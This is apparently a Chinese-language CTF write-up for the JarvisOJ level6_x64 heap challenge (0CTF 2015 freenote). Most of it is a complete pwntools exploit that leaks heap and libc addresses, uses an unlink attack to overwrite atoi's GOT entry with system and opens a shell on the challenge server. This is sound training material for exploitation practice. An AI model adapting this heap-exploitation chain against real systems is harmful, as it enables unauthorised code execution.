---
layout:     post
title:      jarvisoj level6_x64
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>https://www.jarvisoj.com  
>  
>Download:  
>https://dn.jarvisoj.com/challengefiles/level6_x64.rar.70d1ee5db56830c021da3fbd9818a030  
>  
>Address:  
>nc pwn2.jarvisoj.com 9886  
<!-- more -->


### 0x00 exploit

与Guestbook2类似, 其实就是2015年0ctf的一道pwn题, 分析过程看Guestbook2

#### 传送门: [Guestbook2](http://www.wooy0ung.me/writeup/2017/07/31/jarvisoj-guestbook2/)

完整的exploit如下, 改了地址、端口, 直接打过去

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

Io = remote('pwn2.jarvisoj.com', 9886)
#Io = process('./freenote_x64')
bin = ELF('./freenote_x64')
libc = ELF('./libc-2.19.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add_post(content):
	Io.sendline('2')
	Io.recvuntil('Length')
	Io.sendline(str(len(content)))
	Io.recvuntil('Enter')
	Io.send(content)
def edit_post(idx,content):
	Io.sendline('3')
	Io.recvuntil('number')
	Io.sendline(str(idx))
	Io.recvuntil('Length')
	Io.sendline(str(len(content)))
	Io.recvuntil('Enter')
	Io.send(content)
def del_post(idx):
	Io.sendline('4')
	Io.recvuntil('number')
	Io.sendline(str(idx))
def get_post(content):
  	Io.recvuntil('Your choice: ')
  	Io.sendline('1')
  	Io.recvuntil(content)
  	return Io.recvuntil('\n')

#-----------------init-------------------
for i in range(4):
	add_post('a')

del_post(0)
del_post(2)

add_post('12345678')

#--------------leak heap_base-------------
leak_data = get_post('12345678')
heap_addr = u64(leak_data[:-1].ljust(0x8,'\x00'))
heap_base = heap_addr - 0x1940
chunk_addr = heap_base + 0x30
success("heap_base: "+hex(heap_base))

del_post(0)
del_post(1)
del_post(3)

#-----------------unlink------------------
size0 = 0x80+0x90+0x90
add_post(p64(0)+p64(size0+1)+p64(chunk_addr-0x18)+p64(chunk_addr-0x10))
add_post("/bin/sh\x00")
add_post("a"*0x80+p64(size0)+p64(0x90)+"a"*0x80+(p64(0)+p64(0x91)+"a"*0x80)*2)
del_post(3)

#------------leak system_addr-------------
atoi_got = bin.got['atoi']

edit_post(0, p64(100)+p64(1)+p64(8)+p64(atoi_got))
leak_data = get_post('0. ')
atoi_addr = u64(leak_data[:-1].ljust(0x8,'\x00'))
system_addr = atoi_addr - libc.symbols['atoi'] + libc.symbols['system']
success("atoi: "+hex(atoi_addr))
success("system: "+hex(system_addr))

#-------------------pwn--------------------
edit_post(0, p64(system_addr))
Io.sendline("$0")
Io.interactive()
```

getshell

![](/assets/img/writeup/pwn/2017-08-03-jarvisoj-level6_x64/0x00.png)